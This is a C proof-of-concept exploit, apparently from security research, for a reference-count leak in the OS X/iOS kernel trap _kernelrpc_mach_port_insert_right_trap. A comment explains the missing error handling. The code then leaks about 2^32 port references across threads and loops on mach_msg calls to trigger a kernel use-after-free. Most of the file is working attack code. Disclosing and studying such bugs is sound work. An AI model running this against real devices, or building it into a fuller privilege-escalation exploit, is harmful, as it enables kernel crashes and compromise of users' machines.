// ianbeer
// build: clang -o trap_leak trap_leak.c -O3

/*
Lack of error checking leads to reference count leak and OS X/iOS kernel UaF in _kernelrpc_mach_port_insert_right_trap

The previous ref count overflow bugs were all kinda slow because they were quite deep in kernel code,
a lot of mach message and MIG code had to run for each leak.

There are a handful of mach operations which have their own fast-path syscalls (mach traps.)
One of these is _kernelrpc_mach_port_insert_right_trap which lets us create a new mach
port name in our process from a port we already have. Here's the code:

  int
  _kernelrpc_mach_port_insert_right_trap(struct _kernelrpc_mach_port_insert_right_args *args)
  {
    task_t task = port_name_to_task(args->target);
    ipc_port_t port;
    mach_msg_type_name_t disp;
    int rv = MACH_SEND_INVALID_DEST;

    if (task != current_task())
      goto done;

    rv = ipc_object_copyin(task->itk_space, args->poly, args->polyPoly,
        (ipc_object_t *)&port);
    if (rv != KERN_SUCCESS)
      goto done;
    disp =  (args->polyPoly);

    rv = mach_port_insert_right(task->itk_space, args->name, port, disp);
    
  done:
    if (task)
      task_deallocate(task);
    return (rv);
  }

ipc_object_copyin will look up the args->poly name (with the args->polyPoly rights)
in the current process's mach port namespace and return an ipc_port_t pointer in port.

If ipc_object_copyin is successful it takes a ref on the port and returns that ref to the caller.

mach_port_insert_right will consume that reference but *only* if it succeeds. If it fails then
no reference is consumed and we can leak one because _kernelrpc_mach_port_insert_right_trap
doesn't handle the failure case.

it's easy to force mach_port_insert_right to fail by specifying an invalid name for the new
right (eg MACH_PORT_NULL.)

This allows you to overflow the reference count of the port and cause a kernel UaF in about 20
minutes using a single thread.
*/

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <mach/mach_error.h>

#include <mach/mach_traps.h>

mach_port_t overflower = MACH_PORT_NULL;

void leak_one_ref() {
  static uint64_t count = 0;
  count++;
  //printf("%d\n", count);
  mach_port_t task_port = mach_task_self();

  if (count == 10) {
    task_port = MACH_PORT_NULL;
  }

  kern_return_t err = _kernelrpc_mach_port_insert_right_trap(
    task_port,
    MACH_PORT_NULL, // an invalid name
    overflower,
    MACH_MSG_TYPE_MAKE_SEND);
  //printf("err %d %s\n", err, mach_error_string(err));
}

void* leaker_thread(void* arg) {
  uint64_t count = (uint64_t)arg;
  for (uint64_t i = 0; i < count; i++) {
    leak_one_ref();
    if ((i % 0x10000) == 0) {
      float done = (float)i/(float)count;
      fprintf(stdout, "\roverflowing... %3.3f%%", done * 100);
      fflush(stdout);
    }
  }
  return NULL;
}


int main(int argc, char** argv) {
  uint32_t n_threads = 1;
  if (argc > 1) {
    n_threads = atoi(argv[1]);
  }

  if (n_threads < 1 || n_threads > 100) {
    printf("bad thread count\n");
    exit(EXIT_FAILURE);
  }
  printf("running with %d threads\n", n_threads);

  kern_return_t err;

  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &overflower);


  /* the port will have one ref (our receive right, held in this process's mach ports table
   * we want to overflow that to 0 such that the next time the kernel copies in the right
   * the ref goes 0 -> 1 then 1 -> 0 when the kernel drops its ref
   * 
   * this will leave us with a dangling mach_port_t pointer in our table
   */
  uint64_t refs_to_leak = 0xffffffff;
  //uint64_t refs_to_leak = 0x1000000;
  uint64_t per_thread_iters = refs_to_leak/n_threads;
  uint64_t remainder = refs_to_leak % n_threads;


  pthread_t threads[n_threads];
  for(uint32_t i = 0; i < n_threads; i++) {
    uint64_t this_thread_iters = per_thread_iters;
    if (i == 0) { //make up the remainder on the first thread
      this_thread_iters += remainder;
    }
    pthread_create(&threads[i], NULL, leaker_thread, (void*)this_thread_iters);
  }

  for(uint32_t i = 0; i < n_threads; i++) {
    pthread_join(threads[i], NULL);
  }

  // we've overflowed the ref count to 0 now; keep using it, it will get freed and reused:
  for(;;) {
    kern_return_t err;
    mach_msg_header_t msg = {0};
    msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0); // no reply port
    msg.msgh_remote_port = overflower;
    msg.msgh_local_port = MACH_PORT_NULL;
    msg.msgh_id = 414141;
    err = mach_msg(&msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);

    struct resp {
      mach_msg_header_t hdr;
      mach_msg_trailer_t trailer;
    };
    struct resp r = {0};
    err = mach_msg(&(r.hdr),
                   MACH_RCV_MSG|MACH_MSG_OPTION_NONE,
                   0,
                   (mach_msg_size_t)sizeof(r),
                   overflower,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
  }
  return 0;

}
